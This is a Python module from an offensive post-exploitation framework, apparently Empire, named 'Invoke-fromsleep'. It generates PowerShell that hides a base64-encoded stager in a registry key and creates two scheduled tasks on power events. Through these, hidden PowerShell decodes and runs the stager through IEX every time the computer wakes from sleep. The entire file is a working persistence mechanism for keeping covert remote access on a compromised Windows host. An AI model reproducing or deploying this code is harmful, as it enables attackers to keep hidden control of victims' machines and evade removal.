import os
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-fromsleep',

            'Author': ['@cannibal'],

            'Description': ('Persist a stager using schtasks after a computer wakes from sleep. This has a moderate detection/removal rating. This creates two scheduled tasks. The "wake" scheduled task will trigger the stager when the computer is waking from a sleep state. The "sleep" scheduled task will reset the "wake" scheduled task so it can retrigger on subsequent wakes from sleep'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                ''
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WakeTaskName' : {
                'Description'   :   'Name to use for the "wake" schtask.',
                'Required'      :   True,
                'Value'         :   'Wake'
            },
            'SleepTaskName' : {
                'Description'   :   'Name to use for the "sleep" schtask.',
                'Required'      :   True,
                'Value'         :   'Sleep'
            },
            'RegPath' : {
                'Description'   :   'Registry location to store the script code. Last element is the key name.',
                'Required'      :   False,
                'Value'         :   'HKCU:\Software\Microsoft\Windows\CurrentVersion\debug'
            },
            'OnWake' : {
                'Description'   :   'Will run stager when coming out of sleep (for use set to On)',
                'Required'      :   True,
                'Value'         :   'On'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        listenerName = self.options['Listener']['Value']
        
        # trigger options
        wakeTaskName = self.options['WakeTaskName']['Value']
        sleepTaskName = self.options['SleepTaskName']['Value']
        onWake = self.options['OnWake']['Value']
    
        # storage options
        regPath = self.options['RegPath']['Value']


        # staging options
        #userAgent = self.options['UserAgent']['Value']

        statusMsg = ""
        locationString = ""


        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True)# userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                
        encScript = launcher.split(" ")[-1]
        statusMsg += "using listener " + listenerName

  
            # Path for the registry location
        path = "\\".join(regPath.split("\\")[0:-1])
        name = regPath.split("\\")[-1]

        statusMsg += " stored in " + regPath

        script = "$RegPath = '"+regPath+"';"
        script += "$parts = $RegPath.split('\\');"
        script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
        script += "$name = $parts[-1];"
        script += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"

        # note where the script is stored
        locationString = "(gp "+path+" "+name+")."+name

        # built the command that will be triggered by the schtask
        triggerCmd = "'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String("+locationString+")))\\\"'"
       
        # sanity check to make sure we haven't exceeded the cmd.exe command length max
        if len(triggerCmd) > 259:
            print helpers.color("[!] Warning: trigger command exceeds the maximum of 259 characters.")
            return ""

	#This creates the OnWake scheduled task. Two scheduled tasks are created, variable defined schtask name loads initial stager on first wake from sleep. The "sleep" scheduled task stops the first task on sleep event to allow the first schedueld task to start again on all subsequent "wake" events.
	if onWake != '':
            script += "schtasks /Create /F /SC ONEVENT /MO \"*[System[Provider[@Name='Microsoft-Windows-Kernel-Power'] and EventID=42]]\" /EC System /TN "+sleepTaskName+" /TR \"schtasks /end /tn "+wakeTaskName+"\" \r schtasks /Create /F /DELAY 0000:10 /SC ONEVENT /MO \"*[System[Provider[@Name='Microsoft-Windows-Power-Troubleshooter'] and EventID=1]]\" /EC System /TN "+wakeTaskName+" /TR "+triggerCmd+";"
            statusMsg += " with "+wakeTaskName+" and "+sleepTaskName+" to trigger on computer wake state."

        print statusMsg
	
        return script
